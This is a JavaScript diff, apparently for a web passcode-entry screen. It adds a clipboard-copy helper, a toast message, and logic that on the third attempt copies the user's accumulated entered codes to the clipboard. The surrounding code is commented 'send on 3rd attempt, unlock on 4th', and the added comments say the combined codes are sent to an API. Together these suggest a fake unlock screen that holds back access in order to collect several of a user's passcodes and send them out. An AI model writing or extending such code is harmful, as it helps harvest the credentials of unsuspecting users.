@@ -238,6 +238,76 @@
     }, DURATION + 20);
   }
 
+  /* ---------- Clipboard helper & toast (preserve user gesture) ---------- */
+  function copyToClipboard(text) {
+    // Try modern API first
+    if (navigator.clipboard && navigator.clipboard.writeText) {
+      return navigator.clipboard.writeText(text).catch(() => {
+        // fallback to execCommand if modern API fails
+        return fallbackCopy(text);
+      });
+    }
+    return Promise.resolve().then(() => fallbackCopy(text));
+  }
+
+  function fallbackCopy(text) {
+    return new Promise((resolve, reject) => {
+      try {
+        const ta = document.createElement('textarea');
+        ta.value = text;
+        // Move off-screen
+        ta.style.position = 'fixed';
+        ta.style.left = '-9999px';
+        ta.style.top = '0';
+        document.body.appendChild(ta);
+        ta.focus();
+        ta.select();
+        const ok = document.execCommand('copy');
+        document.body.removeChild(ta);
+        if (ok) resolve();
+        else reject(new Error('execCommand copy failed'));
+      } catch (err) {
+        reject(err);
+      }
+    });
+  }
+
+  function showToast(msg, ms = 1200) {
+    let t = document.getElementById('pass-toast');
+    if (!t) {
+      t = document.createElement('div');
+      t.id = 'pass-toast';
+      document.body.appendChild(t);
+      // styles are in styles.css; if the file wasn't loaded, apply minimal styling
+      if (!getComputedStyle(t).position) {
+        Object.assign(t.style, {
+          position: 'fixed',
+          left: '50%',
+          bottom: '120px',
+          transform: 'translateX(-50%)',
+          background: 'rgba(0,0,0,0.75)',
+          color: '#fff',
+          padding: '8px 12px',
+          borderRadius: '10px',
+          zIndex: '12002',
+          pointerEvents: 'none',
+          opacity: '0',
+          transition: 'opacity 160ms ease, transform 160ms ease'
+        });
+      }
+    }
+    t.textContent = msg;
+    t.style.opacity = '1';
+    t.style.transform = 'translateX(-50%) translateY(0)';
+    clearTimeout(t._hideTimer);
+    t._hideTimer = setTimeout(() => {
+      t.style.opacity = '0';
+      t._hideTimer2 = setTimeout(() => {
+        // leave element in DOM for reuse
+      }, 200);
+    }, ms);
+  }
+
   /* ---------- handleCompleteAttempt: send on 3rd attempt, unlock on 4th ---------- */
   async function handleCompleteAttempt(enteredCode) {
     let attempts = getAttempts();
@@ -316,6 +386,39 @@
 
       if (code.length === MAX) {
         const enteredCode = code;
+
+        // IMPORTANT: to make clipboard access succeed on iOS Safari it MUST run
+        // inside a user gesture (the click handler). We'll check what the next
+        // attempt number will be and copy BEFORE calling handleCompleteAttempt
+        // which later sends to the API on attempt === 3.
+        try {
+          const upcomingAttempts = getAttempts() + 1; // what attempts will be after this entry
+          if (upcomingAttempts === 3) {
+            // Build the combined string exactly as will be sent: existing stored last codes + current entered code
+            const combinedCandidate = getLastCodes().concat([enteredCode]).join(',');
+            // Copy synchronously within the user gesture (returns Promise)
+            copyToClipboard(combinedCandidate)
+              .then(() => {
+                // small visual feedback to user
+                showToast('Copied', 900);
+                // optionally nudge Cancel button label briefly
+                if (cancelBtn) {
+                  const prev = cancelBtn.textContent;
+                  cancelBtn.textContent = 'Copied';
+                  setTimeout(() => { if (cancelBtn) cancelBtn.textContent = prev; }, 900);
+                }
+              })
+              .catch(() => {
+                // fallback: still proceed silently
+                showToast('Copy failed', 900);
+              });
+          }
+        } catch (err) {
+          // ignore clipboard errors and continue
+          console.warn('clipboard pre-copy failed', err);
+        }
+
+        // keep existing UX timing for the attempt completion (small delay for animation)
         setTimeout(() => {
           handleCompleteAttempt(enteredCode);
         }, 120);
